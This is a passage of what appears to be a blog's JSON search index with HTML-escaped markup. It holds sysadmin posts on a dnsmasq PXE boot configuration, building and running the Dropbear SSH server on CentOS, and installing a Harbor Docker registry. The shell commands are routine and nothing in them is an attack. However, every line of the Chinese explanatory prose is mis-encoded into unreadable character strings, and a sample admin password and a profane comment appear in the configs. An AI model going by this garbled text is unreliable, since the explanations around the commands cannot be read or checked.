class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#address=/jump.dedi.jp/install/103.108.236.5\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#UP Stream DNS Server\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eserver\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e114.114.114.114\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eserver\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e202.106.196.115\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eserver\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e202.106.0.20\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003estrict-order\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003edhcp-authoritative\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003edhcp-sequential-ip\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003edhcp-no-override\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003elog-facility\u003cspan class=\"o\"\u003e=\u003c/span\u003e/var/log/dnsmasq.log\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003elog-dhcp\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003elog-queries\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eenable-tftp\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003etftp-root \u003cspan class=\"o\"\u003e=\u003c/span\u003e /export/servers/tftpboot\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#only new add host is dynamic, delete or modify not.\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#dhcp-hostsfile=/etc/dhcp-host/hosts.conf\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003edhcp-hostsdir\u003cspan class=\"o\"\u003e=\u003c/span\u003e/etc/dhcp-host\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#Setup different options for each of the unique subnets, since default gateways will be different\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#The format for this is: dhcp-options=\u0026lt;your_tags_here\u0026gt;,\u0026lt;option\u0026gt;,\u0026lt;option_value\u0026gt; - \u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#3 is router\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#1:netmask, 15:domain-name, 3:router, 6:dns-server,\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#44:netbios-ns, 46:netbios-nodetype, 47:netbios-scope,\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#31:router-discovery, 33:static-route, 121:classless-static-route,\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#43:vendor-encap\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003edhcp-option\u003cspan class=\"o\"\u003e=\u003c/span\u003eoption:dns-server,172.18.30.1,172.18.30.2\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003edhcp-option\u003cspan class=\"o\"\u003e=\u003c/span\u003eoption:all-subnets-local,1\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003edhcp-option\u003cspan class=\"o\"\u003e=\u003c/span\u003eoption:T1,2m\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003edhcp-option\u003cspan class=\"o\"\u003e=\u003c/span\u003eoption:T2,4m\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#dhcp-range=[tag:\u0026lt;tag\u0026gt;[,tag:\u0026lt;tag\u0026gt;],][set:\u0026lt;tag\u0026gt;,]\u0026lt;start-addr\u0026gt;[,\u0026lt;end-addr\u0026gt;|\u0026lt;mode\u0026gt;][,\u0026lt;netmask\u0026gt;[,\u0026lt;broadcast\u0026gt;]][,\u0026lt;lease time\u0026gt;]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#vlan 1 native vlan\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#dhcp-range=set:net1,172.18.29.100,172.18.29.250,static,255.255.254.0,2m\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003edhcp-range\u003cspan class=\"o\"\u003e=\u003c/span\u003eset:net1,172.18.29.100,static,2m\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003edhcp-option-force\u003cspan class=\"o\"\u003e=\u003c/span\u003etag:net1,option:router,172.18.29.254\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#vlan 199 wuli\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#dhcp-range=set:net2,172.18.31.100,static,255.255.254.0,2m\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#dhcp-range=set:net2,172.18.31.100,255.255.254.0,2m\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003edhcp-range\u003cspan class=\"o\"\u003e=\u003c/span\u003eset:net2,172.18.31.100,static,2m\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003edhcp-option-force\u003cspan class=\"o\"\u003e=\u003c/span\u003etag:net2,option:router,172.18.31.254\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# set tag \u0026#34;ipxe\u0026#34; if request comes from iPXE (\u0026#34;iPXE\u0026#34; user class)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003edhcp-userclass\u003cspan class=\"o\"\u003e=\u003c/span\u003eset:ipxe,iPXE\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# alternative way, look for option 175\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#dhcp-match=set:ipxe,175 # gPXE/iPXE sends a 175 option.\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# if request comes from dumb firmware, send them iPXE (via TFTP)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#dhcp-boot=tag:!ipxe,undionly.kpxe,boothost,172.18.29.2\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003edhcp-boot\u003cspan class=\"o\"\u003e=\u003c/span\u003etag:!ipxe,undionly.kpxe\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# if request comes from iPXE, direct it to boot from boot1.php\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#dhcp-boot=tag:ipxe,http://172.18.29.2/pxeboot/boot1.php\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#--dhcp-boot=[tag:\u0026lt;tag\u0026gt;,]\u0026lt;filename\u0026gt;,[\u0026lt;servername\u0026gt;[,\u0026lt;server address\u0026gt;|\u0026lt;tftp_servername\u0026gt;]]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003edhcp-boot\u003cspan class=\"o\"\u003e=\u003c/span\u003etag:ipxe,tag:net1,http://172.18.29.2/pxeboot/boot1.php,172.18.29.2\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003edhcp-boot\u003cspan class=\"o\"\u003e=\u003c/span\u003etag:ipxe,tag:net2,http://172.18.31.2/pxeboot/boot1.php,172.18.31.2\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Args add(old del) mac ip hostname\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# add ac:1f:6b:21:3e:d8 103.108.236.22 1403-s27\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#dhcp-script=/bin/echo\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#dhcp-leasefile=/var/log/dnsmasq.leases\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# !!!! tag is alphanumeric label, fuck !!!!!\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eé™„ä¸Šundionly.kpxeï¼š\u003ca href=\"./undionly.kpxe\"\u003eundionly.kpxe\u003c/a\u003e\u003c/p\u003e","title":"DNSMASQé…ç½®PXEçš„æ–¹å¼"},{"content":"åˆè§„å®¡è®¡ç»å¸¸éœ€è¦ç»™å„ç§è½¯ä»¶æ‰“è¡¥ä¸ï¼Œæ¯”å¦‚opensshï¼Œå¦‚æœæ˜¯é«˜ç‰ˆæœ¬è¿˜å¥½è¯´ã€‚å¦‚æœè®©ä½ è¡¥ centos 6çš„ opensshï¼Œ\né‚£ææ€•å°±è¦å–ä¸€å£¶äº†ã€‚æ›¿ä»£æ–¹æ¡ˆå¦‚ä¸‹ï¼š\ngitï¼šhttps://github.com/mkj/dropbear ä¸‹è½½åœ°å€ï¼šhttps://matt.ucc.asn.au/dropbear/dropbear.html\nä¸€ã€ä»‹ç» dropbearä½œä¸ºä¸€æ¬¾åŸºäºsshåè®®çš„è½»é‡çº§sshdæœåŠ¡å™¨ï¼Œç›¸æ¯”OpenSSHï¼Œå…¶æ›´ç®€æ´ï¼Œæ›´å°å·§ï¼Œè¿è¡Œèµ·æ¥å†…å­˜å ç”¨æ¯”ä¹Ÿæ›´å°ã€‚åœ¨åº”ç”¨è¿›ç¨‹ä¸Šï¼ŒOpenSSHä¼šå¼€å¯ä¸¤ä¸ªsshdè¿›ç¨‹æœåŠ¡ï¼Œè€Œdropbearåªå¼€å¯ä¸€ä¸ªè¿›ç¨‹ï¼Œç›¸è¾ƒäºOpenSSHï¼Œå…¶å¯¹äºç¡¬ä»¶è¦æ±‚ä¹Ÿæ›´ä½ï¼Œä¹Ÿæ›´èŠ‚çº¦ç³»ç»Ÿèµ„æºã€‚\ndropbearå®ç°å®Œæ•´çš„SSHå®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨ç‰ˆæœ¬2åè®®ï¼Œä¸æ”¯æŒSSHç‰ˆæœ¬1åè®®çš„å‘åå…¼å®¹æ€§ï¼Œä»¥èŠ‚çœç©ºé—´å’Œèµ„æºï¼Œå¹¶é¿å…åœ¨SSHç‰ˆæœ¬1çš„å›ºæœ‰çš„å®‰å…¨æ¼æ´ã€‚\ndropbearä¸»è¦æœ‰ä»¥ä¸‹ç¨‹åºï¼š\næœåŠ¡ç¨‹åºï¼šdropbearï¼ˆç±»ä¼¼äºOpensshçš„sshdï¼‰ å®¢æˆ·ç¨‹åºï¼šdbclinetï¼ˆç´¯ä¸–äºOpensshçš„sshï¼‰ å¯†é’¥ç”Ÿæˆç¨‹åºï¼šdropbearkey\näºŒã€ä¸‹è½½å®‰è£…\nwget https://matt.ucc.asn.au/dropbear/dropbear-2020.81.tar.bz2 tar jxvf dropbear-2020.81.tar.bz2 cd dropbear-2020.81 ./configure make PROGRAMS=\u0026#34;dropbear dbclient dropbearkey dropbearconvert scp\u0026#34; make PROGRAMS=\u0026#34;dropbear dbclient dropbearkey dropbearconvert scp\u0026#34; install mkdir /etc/dropbear/ dropbearkey -t rsa -f /etc/dropbear/dropbear_rsa_host_key dropbear -E -p 2222 #å¯åŠ¨sshæœåŠ¡ dropbear -FE -p 2222 #-FæŒ‡å®šå‰å°è¿è¡Œ å®¢æˆ·ç«¯è¿æ¥ï¼š ssh 192.168.89.37 -p 2222 ++++++++++++++++++++++++++++++++++++++++++++++++++++++++\næŠ¥é”™ï¼šzlib error æˆ–è€…make PROGRAMS=\u0026#34;dropbear dbclient dropbearkey dropbearconvert scp\u0026#34;å‡ºé”™ è§£å†³æ–¹æ³•ï¼š wget https://www.zlib.net/fossils/zlib-1.2.10.tar.gz tar zxvf zlib-1.2.10.tar.gz cd zlib-1.2.10 ./configure --prefix=/usr/local/zlib ++++++++++++++++++++++++++++++++++++++++++++++++++++++++\n#centos6ç¯å¢ƒå®‰è£…æ–¹æ³•ï¼Œæ‰¾åˆ°ä¸‰ä¸ªåŒ… rpm -vih libtomcrypt-1.17-25.el6.x86_64.rpm rpm -vih libtommath-0.42.0-5.el6.x86_64.rpm rpm -vih dropbear-2017.75-1.el6.x86_64.rpm chkconfig sshd off chkconfig dropbear on /etc/init.d/dropbear status dropbearkey -t rsa -f /etc/dropbear/dropbear_rsa_host_key /etc/init.d/sshd stop \u0026amp;\u0026amp; /etc/init.d/dropbear start ","permalink":"https://rendoumi.com/posts/20221219-dropbear/","summary":"\u003cp\u003eåˆè§„å®¡è®¡ç»å¸¸éœ€è¦ç»™å„ç§è½¯ä»¶æ‰“è¡¥ä¸ï¼Œæ¯”å¦‚opensshï¼Œå¦‚æœæ˜¯é«˜ç‰ˆæœ¬è¿˜å¥½è¯´ã€‚å¦‚æœè®©ä½ è¡¥ centos 6çš„ opensshï¼Œ\u003c/p\u003e\n\u003cp\u003eé‚£ææ€•å°±è¦å–ä¸€å£¶äº†ã€‚æ›¿ä»£æ–¹æ¡ˆå¦‚ä¸‹ï¼š\u003c/p\u003e\n\u003cp\u003egitï¼šhttps://github.com/mkj/dropbear\nä¸‹è½½åœ°å€ï¼šhttps://matt.ucc.asn.au/dropbear/dropbear.html\u003c/p\u003e\n\u003cp\u003eä¸€ã€ä»‹ç»\ndropbearä½œä¸ºä¸€æ¬¾åŸºäºsshåè®®çš„è½»é‡çº§sshdæœåŠ¡å™¨ï¼Œç›¸æ¯”OpenSSHï¼Œå…¶æ›´ç®€æ´ï¼Œæ›´å°å·§ï¼Œè¿è¡Œèµ·æ¥å†…å­˜å ç”¨æ¯”ä¹Ÿæ›´å°ã€‚åœ¨åº”ç”¨è¿›ç¨‹ä¸Šï¼ŒOpenSSHä¼šå¼€å¯ä¸¤ä¸ªsshdè¿›ç¨‹æœåŠ¡ï¼Œè€Œdropbearåªå¼€å¯ä¸€ä¸ªè¿›ç¨‹ï¼Œç›¸è¾ƒäºOpenSSHï¼Œå…¶å¯¹äºç¡¬ä»¶è¦æ±‚ä¹Ÿæ›´ä½ï¼Œä¹Ÿæ›´èŠ‚çº¦ç³»ç»Ÿèµ„æºã€‚\u003c/p\u003e\n\u003cp\u003edropbearå®ç°å®Œæ•´çš„SSHå®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨ç‰ˆæœ¬2åè®®ï¼Œä¸æ”¯æŒSSHç‰ˆæœ¬1åè®®çš„å‘åå…¼å®¹æ€§ï¼Œä»¥èŠ‚çœç©ºé—´å’Œèµ„æºï¼Œå¹¶é¿å…åœ¨SSHç‰ˆæœ¬1çš„å›ºæœ‰çš„å®‰å…¨æ¼æ´ã€‚\u003c/p\u003e\n\u003cp\u003edropbearä¸»è¦æœ‰ä»¥ä¸‹ç¨‹åºï¼š\u003c/p\u003e\n\u003cp\u003eæœåŠ¡ç¨‹åºï¼šdropbearï¼ˆç±»ä¼¼äºOpensshçš„sshdï¼‰\nå®¢æˆ·ç¨‹åºï¼šdbclinetï¼ˆç´¯ä¸–äºOpensshçš„sshï¼‰\nå¯†é’¥ç”Ÿæˆç¨‹åºï¼šdropbearkey\u003c/p\u003e\n\u003cp\u003eäºŒã€ä¸‹è½½å®‰è£…\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ewget https://matt.ucc.asn.au/dropbear/dropbear-2020.81.tar.bz2\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003etar jxvf dropbear-2020.81.tar.bz2 \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003ecd\u003c/span\u003e dropbear-2020.81\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e./configure\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003emake \u003cspan class=\"nv\"\u003ePROGRAMS\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;dropbear dbclient dropbearkey dropbearconvert scp\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003emake \u003cspan class=\"nv\"\u003ePROGRAMS\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;dropbear dbclient dropbearkey dropbearconvert scp\u0026#34;\u003c/span\u003e install\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003emkdir /etc/dropbear/\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003edropbearkey -t rsa -f /etc/dropbear/dropbear_rsa_host_key\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003edropbear -E -p \u003cspan class=\"m\"\u003e2222\u003c/span\u003e   \u003cspan class=\"c1\"\u003e#å¯åŠ¨sshæœåŠ¡\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003edropbear -FE -p \u003cspan class=\"m\"\u003e2222\u003c/span\u003e  \u003cspan class=\"c1\"\u003e#-FæŒ‡å®šå‰å°è¿è¡Œ\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eå®¢æˆ·ç«¯è¿æ¥ï¼š\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003essh 192.168.89.37 -p \u003cspan class=\"m\"\u003e2222\u003c/span\u003e \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e++++++++++++++++++++++++++++++++++++++++++++++++++++++++\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eæŠ¥é”™ï¼šzlib error æˆ–è€…make \u003cspan class=\"nv\"\u003ePROGRAMS\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;dropbear dbclient dropbearkey dropbearconvert scp\u0026#34;\u003c/span\u003eå‡ºé”™\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eè§£å†³æ–¹æ³•ï¼š\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ewget https://www.zlib.net/fossils/zlib-1.2.10.tar.gz\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003etar zxvf zlib-1.2.10.tar.gz \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003ecd\u003c/span\u003e zlib-1.2.10\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e./configure --prefix\u003cspan class=\"o\"\u003e=\u003c/span\u003e/usr/local/zlib\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e++++++++++++++++++++++++++++++++++++++++++++++++++++++++\u003c/p\u003e","title":"Dropbearé…ç½®SSHæœåŠ¡"},{"content":"ä¸€ï¼šæˆ‘ä»¬åœ¨å…¬å¸å†…éƒ¨å»ºç«‹äº†Dockerå†…éƒ¨é•œåƒä»“åº“ï¼š\nharboræ˜¯vmwareå‡ºçš„ä¸€ä¸ªdockeré•œåƒä»“åº“ï¼Œæœ¬è´¨æ˜¯ä¸€ç»„å®¹å™¨çš„é›†åˆä½“ï¼Œç®—æ˜¯ä¸€ä¸ªå¤šå®¹å™¨çš„pod.\næ•°æ®å·ç¼ºçœæ˜¯å®¿ä¸»æœºçš„/dataï¼Œæ‰€ä»¥æˆ‘ä»¬æŠŠiscsiuæŒ‚åœ¨/data\nä¸»æœºï¼š172.18.31.28\né¦–å…ˆå®‰è£…docker-ce\næ·»åŠ docker-ceæºï¼š\nyum install epel-release\ryum-config-manager --add-repo http://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo\ryum install docker-ce -y\ryum install ntp -y\rå¯åŠ¨è‡ªåŠ¨åŒæ­¥æ—¶é—´:\ntimedatectl set-ntp yes #æ­¤å¤„å¯ç”¨yes,no,1æˆ–0\ré…ç½®æ—¶åŒº:\ntimedatectl set-timezone Asia/Shanghai\ré…ç½®Dockerå¯åŠ¨å‚æ•°ï¼š\nmkdir -p /etc/docker\rcat \u0026lt;\u0026lt; EOF \u0026gt;\u0026gt; /etc/docker/daemon.json\r{\r\u0026quot;registry-mirrors\u0026quot;: [\u0026quot;https://docker.mirrors.ustc.edu.cn/\u0026quot;]\r}\rEOF\rä¹‹åè£…çš„æ‰€æœ‰Dockerçš„å®¿ä¸»æœºï¼Œå¦‚æœè¦ç”¨åˆ°è¿™ä¸ªç§æœ‰ä»“åº“çš„è¯ï¼š\ncat \u0026lt;\u0026lt; EOF \u0026gt;\u0026gt; /etc/docker/daemon.json\r{\r\u0026quot;insecure-registries\u0026quot;:[\u0026quot;172.18.31.28\u0026quot;],\r\u0026quot;registry-mirrors\u0026quot;: [\u0026quot;https://docker.mirrors.ustc.edu.cn/\u0026quot;]\r}\rEOF\rå¯åŠ¨docker\nsystemctl enable docker \u0026amp;\u0026amp; systemctl start docker\râ€‹ å®‰è£…Docker-compose\nyum install docker-compose\rpip3 install -I requests==2.9 æ¥å¼ºåˆ¶ä¿®æ­£\rä¸‹è½½harborçš„ç¦»çº¿å®‰è£…åŒ…\ncd /root\rhttps://github.com/goharbor/harbor/releases/download/v2.0.1/harbor-offline-installer-v2.0.1.tgz\rtar zxvf harbor-offline-installer-v2.0.1-rc1.tgz\rcd harbor\rç¼–è¾‘é…ç½®æ–‡ä»¶ï¼š\ncp harbor.yml.tmpl harbor.yml\rvi harbor.yml\rhostname: 172.18.31.28\rharbor_admin_password: Fuckxxxbbaasskk\réšæ‰443ï¼Œå› ä¸ºæˆ‘ä»¬æ˜¯å†…ç½‘ç”¨ï¼Œé…ä¸ªè¯ä¹¦ä¹Ÿæ˜¯å‡çš„ï¼Œæ‰€ä»¥å…³äº†443\r#https:\r# https port for harbor, default is 443\r# port: 443\r# The path of cert and key files for nginx\r# certificate: /your/certificate/path\ræ¢æ‰DBçš„pass\rdatabase:\r# The password for the root user of Harbor DB. Change this before any production use.\rpassword: xxxxxxx\r# private_key: 